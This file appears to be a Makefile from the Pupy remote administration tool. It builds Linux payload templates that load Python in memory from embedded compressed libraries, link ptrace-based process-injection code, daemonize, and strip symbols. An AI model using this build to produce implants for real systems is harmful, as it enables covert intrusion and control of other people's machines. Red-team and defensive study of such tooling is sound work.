CC ?= gcc

OS ?= $(shell uname -s)
SUFFIX ?= $(shell echo $(OS) | cut -c -3 | tr '[:upper:]' '[:lower:]')

CFLAGS := $(shell pkg-config --cflags python-2.7) -I../lzma -fPIC $(CFLAGS_EXTRA) -pipe -Wall
LDFLAGS := -lpthread -ldl -fPIC $(LDFLAGS_EXTRA) -Wl,-Bstatic -lz -Wl,-Bdynamic
PFLAGS := -OO
PIE ?= -pie

CFLAGS += -D$(OS) -std=gnu99

ifeq ($(LIBPYTHON),)
LIBPYTHON := $(shell /sbin/ldconfig -p  | awk '/libpython2.7.so/{print $$4}' | head -n 1)
endif

ifeq ($(LIBCRYPTO),)
LIBCRYPTO := $(shell /sbin/ldconfig -p  | awk '/libcrypto.so.1.0.0/{print $$4}' | head -n 1)
endif

ifeq ($(LIBSSL),)
LIBSSL := $(shell /sbin/ldconfig -p  | awk '/libssl.so.1.0.0/{print $$4}' | head -n 1)
endif

XZARGS ?= "gcc" "aligned(0x1000)" 'section(".xzrodata")'

ifeq ($(ARCH),)
ARCH ?= $(shell file $(LIBPYTHON) | grep 32-bit >/dev/null && echo 32 || echo 64)
endif

ifeq ($(ARCH),64)
NAME := 64
LDFLAGS += -m64
else
NAME := 86
endif

CFLAGS += -Iresources/$(ARCH) -Iresources

LINUX_INJECT_CFLAGS := -include fixes.h -include debug.h \
	-Dmain=linux_inject_main -Drealpath=fakepath

ifneq ($(DEBUG),)
DEBUG_ADD := -debug
CFLAGS += -DDEBUG -O0 -g
NAME   := "$(NAME)d"
else
CFLAGS += -Os
LINUX_INJECT_CFLAGS += -Dprintf=dprint -Dfprintf=dfprint
ifeq ($(OS),Linux)
LDFLAGS += -O1 -Wl,-s -Wl,-x -Wl,--gc-sections -Wl,--no-undefined
LDFLAGS += -Wl,-z,now -Wl,-z,combreloc -Wl,--enable-new-dtags
else
LDFLAGS += -s
endif
endif

PYTHON ?= python
TEMPLATE_OUTPUT_PATH ?= ../../pupy/payload_templates/

PYOBJS := _memimporter.o Python-dynload.o pupy_load.o pupy.o
COMMON_OBJS := list.o daemonize.o decompress.o

ifeq ($(UNCOMPRESSED),)
COMMON_OBJS += LzmaDec.o
COMPRESSED = 1
else
CFLAGS += -DUNCOMPRESSED
SUFFIX := unc.$(SUFFIX)
COMPRESSED = 0
endif

ifeq ($(OS),Linux)
ifeq ($(ARCH),64)
COMMON_OBJS += linux-inject/inject-x86_64.o
else
COMMON_OBJS += linux-inject/inject-x86.o
endif

COMMON_OBJS += linux-inject/ptrace.o
COMMON_OBJS += linux-inject/utils.o
endif

all: $(TEMPLATE_OUTPUT_PATH)/pupyx$(NAME).$(SUFFIX) $(TEMPLATE_OUTPUT_PATH)/pupyx$(NAME).$(SUFFIX).so

revision.h:
	if [ x"$$COMMIT" = x"" ]; then rev=`cat ../../.git/\`cat ../../.git/HEAD | cut -f 2 -d \ \` | cut -c 1-8`; \
		else rev=$$COMMIT; fi; echo "#define GIT_REVISION_HEAD \"$$rev\"" >$@

pupy.o: resources/$(ARCH)/library.c revision.h
pupy_load.o: resources/bootloader.c resources/$(ARCH)/python27.c \
	resources/$(ARCH)/libssl.c resources/$(ARCH)/libcrypto.c revision.h

tmplibrary_lmid.o: tmplibrary.c
	$(CC) -c -o $@ $< $(CFLAGS) -DWIP_LMID

import-tab.c import-tab.h: mktab.py
	$(PYTHON) $(PFLAGS) $<

Python-dynload.o: Python-dynload.c import-tab.c import-tab.h
	$(CC) -c -o $@ $< $(CFLAGS)

ifeq ($(UNCOMPRESSED),)
LzmaDec.o: ../lzma/LzmaDec.c
	$(CC) $(CFLAGS) -O3 -fPIC -c -o $@ $<
endif

resources/$(ARCH)/library.txt: ../gen_library_compressed_string.py resources/$(ARCH)/library.zip
	$(PYTHON) $(PFLAGS) ../gen_library_compressed_string.py $@ resources/$(ARCH)/library.zip

resources/$(ARCH)/library.c: ../gen_resource_header.py resources/$(ARCH)/library.txt resources/$(ARCH)/library.zip
	$(PYTHON) $(PFLAGS) ../gen_resource_header.py resources/$(ARCH)/library.txt $@ $(COMPRESSED) $(XZARGS)

resources/bootloader.pyc: ../gen_python_bootloader.py ../../pupy/packages/all/pupyimporter.py ../../pupy/pp.py
	$(PYTHON) $(PFLAGS) ../gen_python_bootloader.py $(DEBUG_ADD)

resources/bootloader.c: ../gen_resource_header.py resources/bootloader.pyc
	$(PYTHON) $(PFLAGS) $+ $@ $(COMPRESSED) $(XZARGS)

linux-inject/%.o: linux-inject/%.c
	$(CC) -c $(LINUX_INJECT_CFLAGS) $(CFLAGS) -o $@ $<

resources/$(ARCH)/python27.so: $(LIBPYTHON)
	@mkdir -p resources/$(ARCH)
	cp -f $< $@.tmp
	-chmod 600 $@.tmp
	-strip $@.tmp
	sed $@.tmp -e 's@/tmp@\x00tmp@g;s@/usr@\x00usr@g' >$@ || ( rm -f $@; cp $@.tmp $@ )
	rm -f $@.tmp

resources/$(ARCH)/libcrypto.so: $(LIBCRYPTO)
	@mkdir -p resources/$(ARCH)
	cp -f $< $@.tmp
	-chmod 600 $@.tmp
	-strip $@.tmp
	mv $@.tmp $@
	rm -f $@.tmp

resources/$(ARCH)/libssl.so: $(LIBSSL)
	@mkdir -p resources/$(ARCH)
	cp -f $< $@.tmp
	-chmod 600 $@.tmp
	-strip $@.tmp
	mv $@.tmp $@
	rm -f $@.tmp

resources/$(ARCH)/library.zip: ../build_library_zip.py ../additional_imports.py
	$(PYTHON) -OO $(PFLAGS) $< $@

resources/$(ARCH)/python27.c: ../gen_resource_header.py resources/$(ARCH)/python27.so
	$(PYTHON) $(PFLAGS) $+ $@ $(COMPRESSED) $(XZARGS)

resources/$(ARCH)/libssl.c: ../gen_resource_header.py resources/$(ARCH)/libssl.so
	$(PYTHON) $(PFLAGS) $+ $@ $(COMPRESSED) $(XZARGS)

resources/$(ARCH)/libcrypto.c: ../gen_resource_header.py resources/$(ARCH)/libcrypto.so
	$(PYTHON) $(PFLAGS) $+ $@ $(COMPRESSED) $(XZARGS)

$(TEMPLATE_OUTPUT_PATH)/pupyx$(NAME).$(SUFFIX): main_exe.o $(PYOBJS) $(COMMON_OBJS) tmplibrary.o 
	$(CC) $(PIE) $+ -o $@ $(LDFLAGS)

$(TEMPLATE_OUTPUT_PATH)/pupyx$(NAME).$(SUFFIX).so: main_so.o $(PYOBJS) $(COMMON_OBJS) tmplibrary_lmid.o 
	$(CC) -shared $+ -o $@ $(LDFLAGS) -Wl,-soname,pupyx$(NAME).$(SUFFIX).so

.PHONY: clean all

clean:
	rm -f $(COMMON_OBJS) $(PYOBJS)
	rm -f pupy pupy.so
	rm -f *.o
	rm -f linux-inject/*.o
	rm -f resources/bootloader.pyc
	rm -f resources/*.c
	rm -f resources/$(ARCH)/*.c

distclean: clean
	rm -f import-tab.c
	rm -f import-tab.h
	rm -f revision.h
	rm -rf resources

$(COMMON_OBJS) $(PYOBJS): import-tab.h
